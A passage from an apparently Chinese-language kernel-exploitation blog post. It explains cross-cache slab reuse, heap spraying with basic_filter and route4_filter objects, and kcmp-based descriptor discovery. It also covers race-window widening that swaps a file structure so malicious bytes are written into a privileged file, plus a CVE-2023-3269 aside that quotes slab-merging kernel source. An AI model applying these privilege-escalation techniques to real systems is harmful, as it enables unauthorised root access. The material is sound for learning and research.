pipe</code>一样的效果呢？</p><p>这里先不考虑后续写的手法，从开始用<code>file</code>结构体开始考虑就会发现内核在分配<code>file</code>结构体时会从一个专属的缓存中取出(类似于<code>cred</code>结构体的分配)，所以这时就不得不考虑<code>cross_cache</code>了。</p><p>众所周知，在内核中管理内存方式主要是两种一是<code>slub</code>用于分配较小的<code>object</code>，其次是<code>buddy system</code>机制用于分配页面。当某一个<code>slab page</code>被释放时会被<code>buddy system</code>回收，在后续的某个时间可能会被重用，然而重用就可能导致不同的<code>cache</code>从同一个页中取出了用一个位置的<code>object</code>交由其他内容使用。而<code>cross-cache</code>利用方法则是利用上述这一机制进行的，当某一<code>slab page</code>中的所有内存槽被释放，那么这个<code>slab page</code>会被强制释放给<code>buddy system</code>，此时如果堆喷另一种类型的对象且其对应的缓存耗尽则会向<code>buddy system</code>申请新的内存页，如果恰好使用了我们前面恶意强制释放的<code>slab page</code>则可实现攻击。(<strong>此处的重用机制在下文有详解，为什么不在这写是因为下面分析CVE是我临时起意的</strong>)</p><p>将此方法运用到这一环境中很容易可以想到首先通过大量堆喷<code>basic_filter</code>结构体完成内存布局，随后分配一个<code>route4_filter</code>结构体随后继续堆喷<code>basic_filter</code>结构体，那么此时就很有可能一个页面中只存在<code>basic_filter-&gt;exts-&gt;actions</code>和<code>route4_filter-&gt;exts-&gt;actions</code>，如果控制将这个页面中的结构体对应<code>basic_filter</code>和<code>route4_filter</code>全部释放掉那么这个页面则会被强制释放进入<code>buddy system</code>中。再堆喷大量的正常文件使其成功占领我的<code>UAF object</code>，至此我们仍不知道到底是什么位置或是那个文件描述符占据了我们目标位置，所以这里使用漏洞产生<code>double free</code>再一次堆喷大量正常文件来占据刚刚的空洞，随后通过<code>kcmp</code>系统调用即可找到我们共享文件描述符的位置了。</p><h3 id="延长时间窗口"><a href="#延长时间窗口" class="headerlink" title="延长时间窗口"></a>延长时间窗口</h3><p>前面只提到了可以找到共享文件描述符的位置了，没有继续往后写了，因为这里会遇到一个新的问题了，这里先讲后续的步骤写出来。</p><p>首先，我们已经拿到了目标文件描述符，并且是两个，那我们可以依照常识进行尝试就是我们对其中一个文件描述符中进行写入，对另一个文件描述符写入恶意字符，此时再将两个文件描述符都关闭( 因为都在使用所以此处的引用计数器为2 )，此时再大量堆喷去打开目标特权文件，有一定的几率让特权文件的<code>file</code>结构体会覆盖掉原本的空洞，从而导致后面的恶意字符写入到了特权文件中去了。</p><p>通过前面简要的说明可以看出来这里是存在一个条件竞争的关系，需要在第一个写入垃圾字符，第二个写入恶意字符还没写入时完成偷梁换柱的戏码，看过上一篇文章的朋友可能就会想到使用<code>fuse</code>即可实现，虽然从理论上讲是可以的，但其最终都会利用到内核实现的<code>write</code>的机制。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vfs_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"><span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!access_ok(buf, count)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">ret = rw_verify_area(WRITE, file, pos, count);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"><span class="keyword">if</span> (count &gt; MAX_RW_COUNT)</span><br><span class="line">count =  MAX_RW_COUNT;</span><br><span class="line">file_start_write(file);</span><br><span class="line"><span class="keyword">if</span> (file-&gt;f_op-&gt;write)</span><br><span class="line">ret = file-&gt;f_op-&gt;write(file, buf, count, pos);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (file-&gt;f_op-&gt;write_iter)</span><br><span class="line">ret = new_sync_write(file, buf, count, pos);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span>) &#123;</span><br><span class="line">fsnotify_modify(file);</span><br><span class="line">add_wchar(current, ret);</span><br><span class="line">&#125;</span><br><span class="line">inc_syscw(current);</span><br><span class="line">file_end_write(file);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在经过几层调用，<code>write</code>会进入到上述函数中，可以看到在函数的开头部分会检查该文件是否可以写入随后执行<code>file_start_write</code>然后调用ops中的<code>write</code>最后执行<code>file_end_write</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">file_start_write</span><span class="params">(struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!S_ISREG(file_inode(file)-&gt;i_mode))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">sb_start_write(file_inode(file)-&gt;i_sb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">file_end_write</span><span class="params">(struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!S_ISREG(file_inode(file)-&gt;i_mode))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">__sb_end_write(file_inode(file)-&gt;i_sb, SB_FREEZE_WRITE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这个<code>file_start_write</code>和<code>file_end_write</code>很容易猜出来其功能是什么，这里就是给<code>write</code>加上一个<code>inode</code>锁，当进程A在往程序中写入时进程B会被阻塞在<code>file_start_write</code>的位置，那也就意味着进程B已经通过了程序是否可写的验证了，只是等待进程A写完就会开始写入了，所以在此期间实现上面的偷梁换柱即可，而延长窗口时间的办法就是进程A写入大量数据使进程B阻塞时间延长。</p><h3 id="篇外CVE-2023-3269"><a href="#篇外CVE-2023-3269" class="headerlink" title="篇外CVE-2023-3269"></a>篇外CVE-2023-3269</h3><p>(与本文无瓜，这里主要举个cross-cache的🌰，仔细看了一下感觉这个考虑的问题比此篇文章考虑的要多一点)</p><p>这个漏洞就不展开讲述了，其是一个UAF漏洞，在cpu0访问vma时cpu1触发<code>expand_stack</code>时有一定几率会因为<code>expand_stack</code>释放掉对应的<code>maple node</code>，而另外一边则还在试图访问vma，当然是可以通过某种方式延长窗口时间，这里不过多提到。</p><p>所以如果我们想要实现任意地址读则需要用可控的结构体去占领比如<code>msg_msg</code>，可惜的是我们单纯堆喷<code>msg_msg</code>是无法在内存中申请到对应的位置的。</p><p>此漏洞的攻击方式从两个方向考虑的，第一就是开启了<code>CONFIG_SLAB_MERGE_DEFAULT</code>选项时(该选项默认开启)，意味着打开了<code>slab</code>重用机制，这里简单介绍一下<code>slab</code>重用机制。</p><p>在<a class="link"   href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/" >向pipe_buffer说yes！<i class="fas fa-external-link-alt"></i></a>篇文章中详细描述了一个<code>slab</code>的申请过程但并没有讨论重用slab的选项，这里首先提一下重用的条件，在后续的代码中可以一一得到验证便于理解</p><ul><li><p>对方的slab cache和自己的flag都不开启SLAB_NEVER_MERGE</p></li><li><p>对方的slab cache和自己都没有构造函数</p></li><li><p>对方的slab cache和自己的usersize都为0</p></li><li><p>对方的slab大小和自己的相同</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *</span></span><br><span class="line"><span class="function"><span class="title">kmem_cache_create_usercopy</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> align,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">slab_flags_t</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset, <span class="keyword">unsigned</span> <span class="keyword">int</span> usersize,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *cache_name;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If no slub_debug was enabled globally, the static key is not yet</span></span><br><span class="line"><span class="comment"> * enabled by setup_slub_debug(). Enable it if the cache is being</span></span><br><span class="line"><span class="comment"> * created with any of the debugging flags passed explicitly.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; SLAB_DEBUG_FLAGS)</span><br><span class="line">static_branch_enable(&amp;slub_debug_enabled);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;slab_mutex);</span><br><span class="line"></span><br><span class="line">err = kmem_cache_sanity_check(name, size);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Refuse requests with allocator specific flags */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~SLAB_FLAGS_PERMITTED) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Some allocators will constraint the set of valid flags to a subset</span></span><br><span class="line"><span class="comment"> * of all flags. We expect them to define CACHE_CREATE_MASK in this</span></span><br><span class="line"><span class="comment"> * case, and we&#x27;ll just provide them with a sanitized version of the</span></span><br><span class="line"><span class="comment"> * passed flags.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">flags &amp;= CACHE_CREATE_MASK;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fail closed on bad usersize of useroffset values. */</span></span><br><span class="line"><span class="keyword">if</span> (WARN_ON(!usersize &amp;&amp; useroffset) ||</span><br><span class="line">    WARN_ON(size &lt; usersize || size - usersize &lt; useroffset))</span><br><span class="line">usersize = useroffset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!usersize)</span><br><span class="line">s = __kmem_cache_alias(name, size, align, flags, ctor);</span><br><span class="line"><span class="keyword">if</span> (s)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">cache_name = kstrdup_const(name, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!cache_name) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s = create_cache(cache_name, size,</span><br><span class="line"> calculate_alignment(flags, align, size),</span><br><span class="line"> flags, useroffset, usersize, ctor, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(s)) &#123;</span><br><span class="line">err = PTR_ERR(s);</span><br><span class="line">kfree_const(cache_name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">mutex_unlock(&amp;slab_mutex);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; SLAB_PANIC)</span><br><span class="line">panic(<span class="string">&quot;%s: Failed to create slab &#x27;%s&#x27;. Error %d\n&quot;</span>,</span><br><span class="line">__func__, name, err);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">pr_warn(<span class="string">&quot;%s(%s) failed with error %d\n&quot;</span>,</span><br><span class="line">__func__, name, err);</span><br><span class="line">dump_stack();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kmem_cache_create_usercopy);</span><br></pre></td></tr></table></figure><p>在代码中会验证<code>usersize</code>是否为0，如果是则调用<code>__kmem_cache_alias</code>寻找可重用的<code>slab</code>如果找到了则直接退出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *</span></span><br><span class="line"><span class="class">__<span class="title">kmem_cache_alias</span>(<span class="title">const</span> <span class="title">char</span> *<span class="title">name</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">align</span>,</span></span><br><span class="line"><span class="class">   <span class="title">slab_flags_t</span> <span class="title">flags</span>, <span class="title">void</span> (*<span class="title">ctor</span>)(<span class="title">void</span> *))</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line">s = find_mergeable(size, align, flags, name, ctor);</span><br><span class="line"><span class="keyword">if</span> (s) &#123;</span><br><span class="line">s-&gt;refcount++;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Adjust the object sizes so that we clear</span></span><br><span class="line"><span class="comment"> * the complete object on kzalloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">s-&gt;object_size = max(s-&gt;object_size, size);</span><br><span class="line">s-&gt;inuse = max(s-&gt;inuse, ALIGN(size, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sysfs_slab_alias(s, name)) &#123;</span><br><span class="line">s-&gt;refcount--;</span><br><span class="line">s = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进函数，可以发现其内部其实就是调用了一个<code>find_mergeable</code>去寻找<code>slab</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *<span class="title">find_mergeable</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> align,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">slab_flags_t</span> flags, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab_nomerge)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctor)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">size = ALIGN(size, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));</span><br><span class="line">align = calculate_alignment(flags, align, size);</span><br><span class="line">size = ALIGN(size, align);</span><br><span class="line">flags = kmem_cache_flags(size, flags, name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; SLAB_NEVER_MERGE)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">list_for_each_entry_reverse(s, &amp;slab_caches, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (slab_unmergeable(s))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &gt; s-&gt;size)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; SLAB_MERGE_SAME) != (s-&gt;flags &amp; SLAB_MERGE_SAME))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check if alignment is compatible.</span></span><br><span class="line"><span class="comment"> * Courtesy of Adrian Drzewiecki</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((s-&gt;size &amp; ~(align - <span class="number">1</span>)) != s-&gt;size)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;size - size &gt;= <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_SLAB) &amp;&amp; align &amp;&amp;</span><br><span class="line">(align &gt; s-&gt;align || s-&gt;align % align))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在函数内部则会校验前面提到的<code>flags</code>中不存在<code>SLAB_NEVER_MERGE</code>，随后遍历<code>slab_caches</code>全局链表使用<code>slab_unmergeable</code>函数查看是否可以重用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span> slab_nomerge = !IS_ENABLED(CONFIG_SLAB_MERGE_DEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">slab_unmergeable</span><span class="params">(struct kmem_cache *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (slab_nomerge || (s-&gt;flags &amp; SLAB_NEVER_MERGE))</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;ctor)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;usersize)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We may have set a slab to be unmergeable during bootstrap.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (s-&gt;refcount &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数会依次验证是否开启<code>CONFIG_SLAB_MERGE_DEFAULT</code>选项，<code>flags</code>标志位是否存在<code>SLAB_NERVER_MERGE</code>，是否存在构造函数，<code>usersize</code>是否为0，最后是引用次数小于0表示该slab准备释放无法重用。</p><p>以上就是<code>slab</code>重用的基本机制，从而可以得出，如果在开启了<code>CONFIG_SLAB_MERGE_DEFAULT</code>内核选项时存在<code>UAF</code>的<code>maple node</code>所在的<code>slab</code>是会进入到重用链表中取得，而后可以使用<code>msg_msg</code>结构体堆喷相同大小从而分配到<code>UAF</code>的<code>maple node</code>上去的。但是原文重点讲述了在没有开启<code>CONFIG_SLAB_MERGE_DEFAULT</code>选项时如何解决。</p><p>首先现在的很多计算机采用的时<code>NUMA</code>架构，意味着对于每个CPU来说是存在两条链表来存放被释放的slab，首先是<code>cpu_slab</code>和<code>NODE</code>的<code>partial list</code>，又因为不存在<code>CONFIG_SLAB_MERGE_DEFAULT</code>选项的关系，被释放的slab是无法被申请重用的所以这里需要将<code>slab UAF</code>转化为<code>page UAF</code>。</p><p>原文在这里使用的方式是通过<code>clone</code>&#x2F;<code>fork</code>大量进程来申请大量相同的<code>vma</code>树，然后让一个<code>slab</code>中的所有内容都为我们的<code>maple node</code>，此时可以释放掉每个<code>slab</code>的多余的内容只留下一个<code>object</code>，最后触发漏洞，使其也被释放掉。因为一整个<code>slab</code>上的所有对象都被释放掉了，也就意味着此<code>slab</code>会被强制释放，随后会进入<code>cpu_slab</code>，如果我们前面申请的大量相同进程导致其满了则会进入<code>node</code>的<code>partial list</code>如果也满了则会进入销毁<code>slab</code>的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __slab_free(struct kmem_cache *s, struct page *page,</span><br><span class="line"><span class="keyword">void</span> *head, <span class="keyword">void</span> *tail, <span class="keyword">int</span> cnt,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *prior;</span><br><span class="line"><span class="keyword">int</span> was_frozen;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">new</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> counters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!<span class="keyword">new</span>.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))</span><br><span class="line"><span class="keyword">goto</span> slab_empty;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Objects left in the slab. If it was not on the partial list before</span></span><br><span class="line"><span class="comment"> * then add it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;</span><br><span class="line">remove_full(s, n, page);</span><br><span class="line">add_partial(n, page, DEACTIVATE_TO_TAIL);</span><br><span class="line">stat(s, FREE_ADD_PARTIAL);</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">slab_empty:</span><br><span class="line"><span class="keyword">if</span> (prior) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slab on the partial list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">remove_partial(n, page);</span><br><span class="line">stat(s, FREE_REMOVE_PARTIAL);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Slab must be on the full list */</span></span><br><span class="line">remove_full(s, n, page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">stat(s, 